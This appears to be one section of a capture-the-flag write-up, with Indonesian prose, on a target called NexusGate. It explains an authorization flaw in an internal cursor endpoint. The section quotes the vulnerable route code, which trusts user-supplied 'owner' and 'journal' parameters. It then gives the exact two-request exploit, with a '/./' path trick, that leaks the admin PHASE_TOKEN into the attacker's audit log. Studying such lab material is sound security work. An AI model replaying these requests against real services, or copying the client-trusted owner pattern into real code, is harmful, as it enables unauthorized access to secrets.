# NexusGate — Cursor over-grant → PHASE_TOKEN

[← Overview](50-nexusgate.md) · [Index](index.md)

## 2.2 Cursor over-grant → PHASE_TOKEN

`routes.js`:

```js
if (pathname === '/internal/console/cursor') {
  if (req.method === 'POST') {
    const id = url.searchParams.get('id');
    const owner = url.searchParams.get('owner') || '';
    if (!id) return json(400, { err: 'id required' });
    cursors.set(id, tagStore.iterate`SELECT * FROM vault WHERE owner = ${owner}`);
    json(200, { ok: true });
    return;
  }
  if (req.method === 'GET') {
    const id = url.searchParams.get('id');
    const juser = url.searchParams.get('journal');
    const it = cursors.get(id);
    if (!it) return json(400, { err: 'no such cursor' });
    const r = it.next();
    if (r.done) return json(200, { done: true });
    const row = r.value;
    if (juser) journal(juser, `vault row: owner=${row.owner} secret=${row.secret}`);
    json(200, { done: false, owner: row.owner });
    return;
  }
}
```

Masalah:
- `owner` berasal dari user, bukan dari session. Penyerang dapat membuat cursor `owner=admin`.
- `journal` juga berasal dari user; endpoint GET menulis **secret** row ke journal user tersebut.
- `db.js` menyimpan `PHASE_TOKEN` sebagai secret admin:

```js
const PHASE_TOKEN = crypto.randomBytes(16).toString('hex');
...
db.prepare('INSERT INTO vault VALUES (?, ?)').run('admin', PHASE_TOKEN);
```

Dengan dua request:

```http
POST /./internal/console/cursor?id=c1&owner=admin
-> {"ok":true}

GET /./internal/console/cursor?id=c1&journal=<user>
-> {"done":false,"owner":"admin"}
```

Audit user `<user>` sekarang berisi:

```text
vault row: owner=admin secret=391ed5122926c01beeaa3d682662552c
```

`GET /audit` (JSON) mengembalikan journal tersebut. Token ini adalah `PHASE_TOKEN` yang dibutuhkan endpoint file.
